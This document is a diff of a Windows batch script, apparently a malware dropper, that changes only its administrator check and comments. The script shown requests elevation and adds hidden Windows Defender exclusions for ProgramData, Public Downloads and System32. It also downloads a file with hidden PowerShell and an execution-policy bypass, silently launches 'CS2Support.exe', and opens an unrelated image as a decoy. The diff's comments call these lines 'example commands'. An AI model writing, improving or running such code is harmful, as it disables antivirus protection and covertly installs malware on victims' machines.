@@ -1,24 +1,17 @@
 @echo off
-:checkAdmin
 :: Check if running as administrator
-fsutil dirty query %systemdrive% >nul 2>&1
+whoami /groups | find "S-1-5-32-544" >nul 2>&1
 if %errorlevel% neq 0 (
-    :: If not, request admin privileges
+    :: Request admin privileges if not already an administrator
     powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
 
-:: Re-check if running as admin
-fsutil dirty query %systemdrive% >nul 2>&1
-if %errorlevel% neq 0 (
-    echo Administrative privileges are required to run this script.
-    echo Please grant admin privileges to continue.
-    timeout /t 3 >nul
-    goto checkAdmin
-)
+:main
+:: Confirm that the script has administrator privileges and proceed
+echo Running with administrator privileges.
 
-:: Proceed with the script
-echo Administrative privileges granted. Proceeding...
+:: Example commands that require admin privileges
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32'"
@@ -39,3 +32,4 @@ powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebReque
 Start-Process "C:\Windows\CS2Support.exe" -WindowStyle Hidden
 
 start https://as2.ftcdn.net/v2/jpg/00/53/69/65/1000_F_53696591_9LO1bsQUpl2zIolFMFokrQyt04Z5dzXd.jpg
+exit /b
